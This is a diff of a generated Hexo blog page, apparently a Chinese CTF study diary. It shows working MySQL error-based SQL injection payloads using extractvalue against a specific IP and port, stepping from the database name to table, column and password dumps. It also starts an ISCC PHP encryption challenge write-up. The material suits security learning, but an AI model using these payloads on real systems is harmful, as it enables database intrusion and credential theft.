@@ -6,19 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>thirdth-day | Hexo</title>
+  <title>13th-day | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="&amp;emsp;&amp;emsp;关于报错注入的一些小总结:MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：extractvalue、updatexml.ExtractValue() 使用XPath表示法从XML字符串中提取值UpdateXML()     返回替换的XML片段举例其用法:emsp;&amp;emsp;先从爆库开始:http://219.153.49.228:49919/ne">
+  <meta name="description" content="&amp;emsp;&amp;emsp;关于报错注入的一些小总结:MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：extractvalue、updatexml.ExtractValue() 使用XPath表示法从XML字符串中提取值UpdateXML()     返回替换的XML片段举例其用法:emsp;&amp;emsp;先从爆库开始">
 <meta property="og:type" content="article">
-<meta property="og:title" content="thirdth-day">
+<meta property="og:title" content="13th-day">
 <meta property="og:url" content="http://yoursite.com/2019/08/12/13th-day/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="&amp;emsp;&amp;emsp;关于报错注入的一些小总结:MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：extractvalue、updatexml.ExtractValue() 使用XPath表示法从XML字符串中提取值UpdateXML()     返回替换的XML片段举例其用法:emsp;&amp;emsp;先从爆库开始:http://219.153.49.228:49919/ne">
+<meta property="og:description" content="&amp;emsp;&amp;emsp;关于报错注入的一些小总结:MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：extractvalue、updatexml.ExtractValue() 使用XPath表示法从XML字符串中提取值UpdateXML()     返回替换的XML片段举例其用法:emsp;&amp;emsp;先从爆库开始">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-08-12T02:42:09.027Z">
+<meta property="og:updated_time" content="2019-08-14T01:45:06.723Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="thirdth-day">
-<meta name="twitter:description" content="&amp;emsp;&amp;emsp;关于报错注入的一些小总结:MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：extractvalue、updatexml.ExtractValue() 使用XPath表示法从XML字符串中提取值UpdateXML()     返回替换的XML片段举例其用法:emsp;&amp;emsp;先从爆库开始:http://219.153.49.228:49919/ne">
+<meta name="twitter:title" content="13th-day">
+<meta name="twitter:description" content="&amp;emsp;&amp;emsp;关于报错注入的一些小总结:MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：extractvalue、updatexml.ExtractValue() 使用XPath表示法从XML字符串中提取值UpdateXML()     返回替换的XML片段举例其用法:emsp;&amp;emsp;先从爆库开始">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -161,7 +161,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      thirdth-day
+      13th-day
     </h1>
   
 
@@ -174,7 +174,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>&emsp;&emsp;关于报错注入的一些小总结:MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：extractvalue、updatexml.ExtractValue() 使用XPath表示法从XML字符串中提取值<br>UpdateXML()     返回替换的XML片段<br>举例其用法:<br>emsp;&emsp;先从爆库开始:<br><a href="http://219.153.49.228:49919/new\_list.php?id=1&#39;" target="_blank" rel="noopener">http://219.153.49.228:49919/new\_list.php?id=1&#39;</a> and extractvalue(1,concat(0x7e,(database()),0x7e))--+<br>emsp;&emsp;然后开始爆表:<br><a href="http://219.153.49.228:49919/new\_list.php?id=1&#39;" target="_blank" rel="noopener">http://219.153.49.228:49919/new\_list.php?id=1&#39;</a> and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1 ),0x7e))--+<br>&emsp;&emsp;然后开始爆表里的字段：<br><a href="http://219.153.49.228:49919/new\_list.php?id=1%27%20and%20extractvalue" target="_blank" rel="noopener">http://219.153.49.228:49919/new\_list.php?id=1%27%20and%20extractvalue</a>(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’member’ ),0x7e))–+<br>emsp;&emsp;最后爆表里的数据:<br><a href="http://219.153.49.228:49919/new\_list.php?id=1%27%20and%20extractvalue" target="_blank" rel="noopener">http://219.153.49.228:49919/new\_list.php?id=1%27%20and%20extractvalue</a>(1,concat(0x7e,(select group_concat(password) from member ),0x7e))–+<br>emsp;&emsp;基本上就是and extractvalue(1,concat(0x7e,(查询语句),0x7e))最后可以用–+，也就是注释加符号的用法隔开最后的引号。<br>37.PHP_encrypt_1(ISCCCTF)<br>&emsp;&emsp;这道题没有链接，进去只有一个fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=<br>和一个文件，先将这个base64解密看一下。解码以后是乱码，先不管这个打开提示文件看一下。解压后是一个php文件，本地运行看一下。这儿由于它叫index.php因而直接打开了打开后是空白的,直接看代码如下所示:<br><?php
+        <p>&emsp;&emsp;关于报错注入的一些小总结:MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：extractvalue、updatexml.ExtractValue() 使用XPath表示法从XML字符串中提取值<br>UpdateXML()     返回替换的XML片段<br>举例其用法:<br>emsp;&emsp;先从爆库开始<a id="more"></a>:<br><a href="http://219.153.49.228:49919/new\_list.php?id=1&#39;" target="_blank" rel="noopener">http://219.153.49.228:49919/new\_list.php?id=1&#39;</a> and extractvalue(1,concat(0x7e,(database()),0x7e))--+<br>emsp;&emsp;然后开始爆表:<br><a href="http://219.153.49.228:49919/new\_list.php?id=1&#39;" target="_blank" rel="noopener">http://219.153.49.228:49919/new\_list.php?id=1&#39;</a> and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1 ),0x7e))--+<br>&emsp;&emsp;然后开始爆表里的字段：<br><a href="http://219.153.49.228:49919/new\_list.php?id=1%27%20and%20extractvalue" target="_blank" rel="noopener">http://219.153.49.228:49919/new\_list.php?id=1%27%20and%20extractvalue</a>(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’member’ ),0x7e))–+<br>emsp;&emsp;最后爆表里的数据:<br><a href="http://219.153.49.228:49919/new\_list.php?id=1%27%20and%20extractvalue" target="_blank" rel="noopener">http://219.153.49.228:49919/new\_list.php?id=1%27%20and%20extractvalue</a>(1,concat(0x7e,(select group_concat(password) from member ),0x7e))–+<br>emsp;&emsp;基本上就是and extractvalue(1,concat(0x7e,(查询语句),0x7e))最后可以用–+，也就是注释加符号的用法隔开最后的引号。<br>37.PHP_encrypt_1(ISCCCTF)<br>&emsp;&emsp;这道题没有链接，进去只有一个fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=<br>和一个文件，先将这个base64解密看一下。解码以后是乱码，先不管这个打开提示文件看一下。解压后是一个php文件，本地运行看一下。这儿由于它叫index.php因而直接打开了打开后是空白的,直接看代码如下所示:<br><?php
 function encrypt($data,$key)
 {
     $key = md5('ISCC');
